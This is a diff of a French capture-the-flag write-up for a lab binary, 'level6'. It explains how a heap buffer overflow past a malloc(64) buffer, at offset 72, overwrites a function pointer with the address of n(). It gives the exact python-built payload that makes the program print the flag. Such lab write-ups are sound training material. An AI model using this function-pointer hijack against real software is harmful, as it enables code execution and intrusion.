@@ -1,18 +1,54 @@
-Il y a une fonction n() qui permet d'avoir le flague donc le but va etre de l'executer
+### Level 6
 
-on voit que notre argument va etre copier dans une variable allouer dynamiquement avec un malloc et au'il y a un pointeur sur une fonction m()
-qui sera exectuer dans tout les cas. Le jeu va t'etre de passer par un buffer overflow pour passe dans le pointeur et y mettre l'adresse de n()
+#### Etape 01 :
 
-pour ca il va falloir trouver l'offset correct pour acceder au pointeur de la fonction m()
+On identifie la fonction importante : `n()`.
 
-on voit que le malloc est de 64 pour la variable dans laquelle sera copier notre entré, donc on part de la en tatonnant et on trouve 72 pour offset
+- `n()` permet d'obtenir le flag.
+- Le but est donc de forcer le programme a executer `n()`.
 
-run $(python -c 'print "e" * 72')
+#### Etape 02 :
 
-l'adresse de n() est 0x08048454
+En analysant le code, on voit que :
 
-a partir de la c'est simple on va juste reecrire l'adresse de n() un overflow :
+- notre argument est copie dans un buffer alloue dynamiquement (`malloc(64)`),
+- un pointeur de fonction (initialement sur `m()`) est ensuite appele.
 
-./level6 $(python -c 'print "A"*72 + "\x54\x84\x04\x08"')
+L'idee est de faire un **buffer overflow** pour ecraser ce pointeur de fonction et y placer l'adresse de `n()`.
 
-le flag apparait
+#### Etape 03 :
+
+Il faut trouver l'offset exact pour atteindre le pointeur de fonction.
+
+Comme le buffer fait 64 octets, on commence autour de cette valeur, puis on ajuste.
+
+Apres test, l'offset correct est `72`.
+
+Exemple de test das gdb :
+
+```bash
+./level6 $(python -c 'print "e" * 72')
+```
+
+#### Etape 04 :
+
+On recupere l'adresse de `n()` :
+
+```text
+0x08048454
+```
+
+En little-endian, cela donne : `\x54\x84\x04\x08`.
+
+#### Etape 05 :
+
+On construit le payload :
+
+- 72 caracteres de remplissage,
+- puis l'adresse de `n()` pour ecraser le pointeur de fonction.
+
+```bash
+./level6 $(python -c 'print "A" * 72 + "\x54\x84\x04\x08"')
+```
+
+Le programme saute alors dans `n()` et le flag apparait.
